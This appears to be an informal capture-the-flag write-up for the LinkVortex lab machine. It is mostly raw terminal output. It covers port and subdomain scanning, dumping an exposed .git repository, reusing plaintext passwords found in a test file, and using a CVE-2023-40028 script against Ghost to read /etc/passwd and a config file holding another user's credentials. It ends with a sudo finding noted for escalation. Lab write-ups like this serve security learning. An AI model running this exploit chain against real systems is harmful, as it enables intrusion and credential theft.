Nmap scan :
─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-xylyllvqha]─[~/Desktop]
└──╼ [★]$ nmap -sC -sV 10.129.117.150
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 19:56 CST
Nmap scan report for 10.129.117.150
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.49 seconds
***
[★]$ ffuf -c -u http://linkvortex.htb/ -H "HOST: FUZZ.linkvortex.htb" -w /usr/share/wordlists/wfuzz/general/common.txt -fc 301

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

:: Progress: [1/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [40/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [40/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [80/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors:: Progress: [119/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [159/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [199/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [225/951] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error:: Progress: [239/951] :: Job [1/1] :: 339 req/sec :: Duration: [0:00:01] :: Err:: Progress: [279/951] :: Job [1/1] :: 273 req/sec :: Duration: [0:00:01] :: Err *dev*                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 148ms]
:: Progress: [318/951] :: Job [1/1] :: 272 req/sec :: Duration: [0:00:01] :: Err:: Progress: [319/951] :: Job [1/1] :: 338 req/sec :: Duration: [0:00:01] :: Err:: Progress: [359/951] :: Job [1/1] :: 340 req/sec :: Duration: [0:00:01] :: Err:: Progress: [399/951] :: Job [1/1] :: 340 req/sec :: Duration: [0:00:01] :: Err:: Progress: [439/951] :: Job [1/1] :: 341 req/sec :: Duration: [0:00:01] :: Err:: Progress: [479/951] :: Job [1/1] :: 341 req/sec :: Duration: [0:00:01] :: Err:: Progress: [479/951] :: Job [1/1] :: 341 req/sec :: Duration: [0:00:01] :: Err:: Progress: [519/951] :: Job [1/1] :: 341 req/sec :: Duration: [0:00:02] :: Err:: Progress: [559/951] :: Job [1/1] :: 342 req/sec :: Duration: [0:00:02] :: Err:: Progress: [599/951] :: Job [1/1] :: 342 req/sec :: Duration: [0:00:02] :: Err:: Progress: [639/951] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:02] :: Err:: Progress: [679/951] :: Job [1/1] :: 342 req/sec :: Duration: [0:00:02] :: Err:: Progress: [719/951] :: Job [1/1] :: 342 req/sec :: Duration: [0:00:02] :: Err:: Progress: [719/951] :: Job [1/1] :: 342 req/sec :: Duration: [0:00:02] :: Err:: Progress: [759/951] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:02] :: Err:: Progress: [799/951] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:03] :: Err:: Progress: [839/951] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:03] :: Err:: Progress: [879/951] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:03] :: Err:: Progress: [919/951] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:03] :: Err:: Progress: [951/951] :: Job [1/1] :: 343 req/sec :: Duration: [0:00:03] :: Err:: Progress: [951/951] :: Job [1/1] :: 276 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-xylyllvqha]─[~/Desktop]
└──╼ [★]$ 

- We find the Dev option using ffuf so we can add this to our hosts file in /etc/hosts

***
***
gobuster dir -u http://dev.linkvortex.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.linkvortex.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.git                 (Status: 301) [Size: 239] [--> http://dev.linkvortex.htb/.git/]
/.git/config          (Status: 200) [Size: 201]
/.git/HEAD            (Status: 200) [Size: 41]
/.git/logs/           (Status: 200) [Size: 868]
/.hta                 (Status: 403) [Size: 199]
/.htpasswd            (Status: 403) [Size: 199]
/.htaccess            (Status: 403) [Size: 199]
/.git/index           (Status: 200) [Size: 707577]
/cgi-bin/             (Status: 403) [Size: 199]
/index.html           (Status: 200) [Size: 2538]
/server-status

***
/.git/HEAD has some sort of hash in its webpage. I still have no clue what is for so we save it for now 
299cdb4387763f850887275a716153e84793077d

***
./gitdumper.sh http://dev.linkvortex.htb/.git/ ~/linkvortex
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating /home/kaimup/linkvortex/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[-] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[+] Downloaded: packed-refs
[-] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[-] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[-] Downloaded: objects/29/9cdb4387763f850887275a716153e84793077d
[-] Downloaded: objects/95/c8cd18cb03afb956fadc9f3346ae6fae3db80d
[-] Downloaded: objects/00/00000000000000000000000000000000000000
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-xylyllvqha]─[~/Downloads/GitTools/Dumper]
└──╼ [★]$ 

***
eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-xylyllvqha]─[~/Downloads/GitTools/Dumper]
└──╼ [★]$ cd ~/linkvortex/.git
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-xylyllvqha]─[~/linkvortex/.git]
└──╼ [★]$ ls
config  description  HEAD  index  info  logs  objects  packed-refs  refs


***
Had to download another tool for this too work

./git_dumper.py http://dev.linkvortex.htb/.git dumped-repo
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper]
└──╼ [★]$ ls
dumped-repo    LICENSE         README.md         setup.cfg
git_dumper.py  pyproject.toml  requirements.txt
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper]
└──╼ [★]$ cd dumped-repo/
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper/dumped-repo]
└──╼ [★]$ ls
apps              ghost    nx.json       PRIVACY.md  SECURITY.md
Dockerfile.ghost  LICENSE  package.json  README.md   yarn.lock
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper/dumped-repo]
└──╼ [★]$ cd apps
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper/dumped-repo/apps]
└──╼ [★]$ ls
admin-x-settings  comments-ui  signup-form
announcement-bar  portal       sodo-search
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper/dumped-repo/apps]
└──╼ [★]$ cd admin-x-settings/
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper/dumped-repo/apps/admin-x-settings]
└──╼ [★]$ ls
index.html            public               test
package.json          README.md            tsconfig.json
playwright.config.ts  src                  tsconfig.node.json
postcss.config.cjs    tailwind.config.cjs  vite.config.ts
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper/dumped-repo/apps/admin-x-settings]
└──╼ [★]$ cat index.html 
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Settings - Admin</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="/src/main.tsx"></script>
  </body>
</html>
┌─[eu-dedivip-1]─[10.10.14.158]─[kaimup@htb-9miffr0z1f]─[~/Desktop/git-dumper/dumped-repo/apps/admin-x-settings]
└──╼ [★]$ 

***
This is to view every the file Authentication.test.js
cat ghost/core/test/regression/api/admin/authentication.test.js


Password *OctopiFociPilfer45* *thisissupersafe* 

***
finding a login screen in linkvortex.htb we use

ADmin@linkvortex,htb with pass OctopiFociPilfer45


***
We then find a CVE for ghost application witch lets us get a command line 

./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> etc/passwd
<!DOCTYPE html>
***
If we cat the docker.ghost file we can find where this information lies. 


file> /var/lib/ghost/config.production.json


": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }

***
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,
    env_keep+=CHECK_CONTENT
 
User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png


Always check if users can use any commands without root like the one above, this can lead to interesting combinations to get root.txt
